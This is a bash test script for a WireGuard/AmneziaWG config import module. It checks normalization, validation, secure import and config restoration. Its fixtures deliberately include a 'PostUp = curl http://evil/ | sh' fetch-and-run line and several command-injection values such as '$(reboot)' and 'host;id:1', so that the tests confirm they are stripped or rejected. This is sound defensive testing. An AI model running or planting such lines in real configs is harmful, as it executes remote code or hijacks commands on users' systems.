#!/bin/bash
set -euo pipefail

repo=$(cd "$(dirname "$0")/.." && pwd)
test_dir=$(mktemp -d /tmp/mtproxyl-awg.XXXXXX)
trap 'rm -rf "$test_dir"' EXIT

INSTALL_DIR="$test_dir/opt"
BACKUP_DIR="$test_dir/backups"
VERSION=test
BLUE="" GREEN="" YELLOW="" RED="" NC="" BOLD="" DIM="" CYAN=""
SYM_CHECK="+" SYM_WARN="!" SYM_CROSS="x" SYM_OK="+"
mkdir -p "$INSTALL_DIR"

# shellcheck source=/dev/null
source "$repo/lib/utils.sh"
source "$repo/lib/detect.sh"
source "$repo/lib/secrets.sh"
source "$repo/lib/donor.sh"
source "$repo/lib/awg.sh"

fails() { if "$@" >/dev/null 2>&1; then echo "Должно было не пройти: $*" >&2; exit 1; fi; }
check_root() { :; }
_mktemp() { mktemp "${1:-$test_dir}/.tmp.XXXXXX"; }

K1="SH3OIYp3CI4y87GeQiH6RpoZno//jwFfCy4dZAm3qnQ="
K2="9dtJF55DbiNNS3NavGV4eBmzq+EPqYlZT0QDfBbZWFA="
good="$test_dir/My Server.conf"
cat > "$good" <<CONF
[Interface]
PrivateKey = $K1
Address = 10.66.0.2/32
DNS = 1.1.1.1, 1.0.0.1
Jc = 100
Jmin = 20
Jmax = 100
S1 = 0
S2 = 0
H1 = 1
H2 = 2
H3 = 3
H4 = 4
I1 = <b 0xc70000000108aabbccddeeff001122> <r 16>
PostUp = curl http://evil/ | sh
Table = auto

[Peer]
PublicKey = $K2
PresharedKey = $K2
Endpoint = vpn.example.org:51820
AllowedIPs = 0.0.0.0/0, ::/0
PersistentKeepalive = 15
CONF

# Нормализация: DNS, PostUp и Table вырезаны, I1 и ключи на месте.
norm=$(_awg_normalize "$good")
grep -q '^I1 = <b 0xc70000000108aabbccddeeff001122> <r 16>$' <<< "$norm"
grep -q "^PrivateKey = $K1$" <<< "$norm"
grep -q '^Endpoint = vpn.example.org:51820$' <<< "$norm"
fails grep -qiE '^(DNS|PostUp|Table)' <<< "$norm"
grep -q '^# DROP: DNS, PostUp, Table$' <<< "$norm"
info=$(_awg_check_file "$good")
[ "$info" = "vpn.example.org:51820|10.66.0.2/32|yes|no" ] || { echo "info: $info" >&2; exit 1; }

# Обычный WireGuard без обфускации тоже годится.
plain="$test_dir/wg0.conf"
printf '[Interface]\nPrivateKey = %s\nAddress = 10.0.0.2/32, fd00::2/128\n\n[Peer]\nPublicKey = %s\nEndpoint = [2001:db8::1]:51820\nAllowedIPs = 0.0.0.0/0\n' "$K1" "$K2" > "$plain"
[ "$(_awg_check_file "$plain")" = "[2001:db8::1]:51820|10.0.0.2/32, fd00::2/128|no|yes" ]

# Конфиг сервера (без Endpoint), мусор и подстановки — отказ.
srv="$test_dir/srv.conf"
printf '[Interface]\nPrivateKey = %s\nAddress = 10.0.0.1/24\nListenPort = 51820\n\n[Peer]\nPublicKey = %s\nAllowedIPs = 10.0.0.2/32\n' "$K1" "$K2" > "$srv"
fails _awg_check_file "$srv"
grep -q 'Endpoint' <<< "$(_awg_check_file "$srv"; echo "$_AWG_FILE_ERR")"
bad="$test_dir/bad.conf"
sed 's/^I1 = .*/I1 = $(reboot)/' "$good" > "$bad"; fails _awg_check_file "$bad"
sed 's/^Address = .*/Address = 1.2.3.4; reboot/' "$good" > "$bad"; fails _awg_check_file "$bad"
sed 's/^Endpoint = .*/Endpoint = host;id:1/' "$good" > "$bad"; fails _awg_check_file "$bad"
sed 's/^PrivateKey = .*/PrivateKey = short/' "$good" > "$bad"; fails _awg_check_file "$bad"
printf 'hello\n' > "$bad"; fails _awg_check_file "$bad"

# Импорт: имя из файла, права 600, ключи в выводе не печатаются.
out=$(awg_import "$good" 2>&1)
fails grep -q "$K1" <<< "$out"
[ -f "$INSTALL_DIR/awg/configs/My_Server.conf" ]
[ "$(stat -c %a "$INSTALL_DIR/awg/configs/My_Server.conf")" = 600 ]
awg_import - --name piped < "$plain" >/dev/null
[ "$(_awg_list_names | paste -sd, -)" = "My_Server,piped" ]
fails awg_import - --name 'bad name' < "$plain"
json=$(awg_import "$plain" --name wg --json)
jq -e '.name == "wg" and .obfuscation == false' <<< "$json" >/dev/null

# Системный конфиг: Table = off, MTU по запросу, без служебных строк.
DONOR_AWG_DIR="$test_dir/etc"
AWG_ACTIVE=My_Server AWG_MTU=1280
_awg_write_sys_conf
sys=$(cat "$test_dir/etc/mtpawg.conf")
grep -q '^Table = off$' <<< "$sys"
grep -q '^MTU = 1280$' <<< "$sys"
fails grep -q '^#' <<< "$sys"

# Поиск: находит в каталоге MTProxyL, свои интерфейсы и импортированные пропускает.
cp "$good" "$INSTALL_DIR/client.conf"
cp "$good" "$INSTALL_DIR/mtpwarp.conf"
found=$(_awg_scan_paths | grep "^$INSTALL_DIR" || true)
[ "$found" = "$INSTALL_DIR/client.conf" ] || { echo "scan: $found" >&2; exit 1; }
fails grep -q "$K1" <<< "$(awg_scan --json)"

# Состояние и строки для ME в конфиге движка.
awg_load
[ -z "$(awg_general_toml)" ]
AWG_ENABLED=true AWG_ACTIVE=My_Server AWG_ME_MODE=natip AWG_EGRESS_IP=203.0.113.153; awg_save
[ "$(awg_general_toml)" = $'middle_proxy_nat_ip = "203.0.113.153"\nmiddle_proxy_nat_probe = false' ]
awg_is_enabled
fails awg_remove My_Server
AWG_ENABLED=false; awg_save
awg_remove piped >/dev/null
[ ! -f "$INSTALL_DIR/awg/configs/piped.conf" ]

# Конфиг цели: исходные значения возвращаются как были.
cfg="$test_dir/target.toml"
printf '[general]\nuse_middle_proxy = true\nmiddle_proxy_nat_probe = true\n\n[server]\nport = 443\n' > "$cfg"
DETECTED_CONFIG_PATH="$cfg"
[ "$(_awg_toml_raw middle_proxy_nat_ip general "$cfg")" = "~" ]
[ "$(_awg_toml_raw middle_proxy_nat_probe general "$cfg")" = "true" ]
_toml_safe_set middle_proxy_nat_ip '"1.2.3.4"' general "$cfg"
_toml_safe_set middle_proxy_nat_probe false general "$cfg"
_awg_target_restore_key middle_proxy_nat_ip "~"
_awg_target_restore_key middle_proxy_nat_probe "true"
[ "$(cat "$cfg")" = "$(printf '[general]\nuse_middle_proxy = true\nmiddle_proxy_nat_probe = true\n\n[server]\nport = 443')" ] \
    || { echo "target:"; cat "$cfg"; exit 1; } >&2

echo "OK awg"
